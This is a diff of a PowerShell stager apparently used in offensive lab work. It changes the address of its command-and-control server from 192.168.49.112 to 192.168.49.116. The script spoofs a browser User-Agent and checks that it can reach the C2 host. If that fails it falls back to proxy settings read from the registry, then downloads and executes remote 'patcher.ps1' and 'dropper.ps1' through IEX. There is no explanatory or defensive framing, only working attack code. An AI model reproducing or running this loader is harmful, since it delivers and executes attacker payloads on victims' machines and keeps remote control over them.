@@ -6,13 +6,13 @@ try {
   $wc = New-Object System.Net.WebClient;
   $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36');
   $wc.proxy = $null;
-  $null = $wc.DownloadString('http://192.168.49.112/');
+  $null = $wc.DownloadString('http://192.168.49.116/');
 } catch {
   try {
     # Enable automatic proxy when callback to the C2 server fails
     $wc = New-Object System.Net.WebClient;
     $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36');
-    $null = $wc.DownloadString('http://192.168.49.112/');
+    $null = $wc.DownloadString('http://192.168.49.116/');
   } catch {
     # When running in SYSTEM integrity level, detect proxy settings manually
     $null = New-PSDrive -Name HKEY_USERS -PSProvider Registry -Root HKEY_USERS;
@@ -24,5 +24,5 @@ try {
   }
 }
 
-IEX $wc.DownloadString('http://192.168.49.112/patcher.ps1');
-IEX $wc.DownloadString('http://192.168.49.112/dropper.ps1');
+IEX $wc.DownloadString('http://192.168.49.116/patcher.ps1');
+IEX $wc.DownloadString('http://192.168.49.116/dropper.ps1');
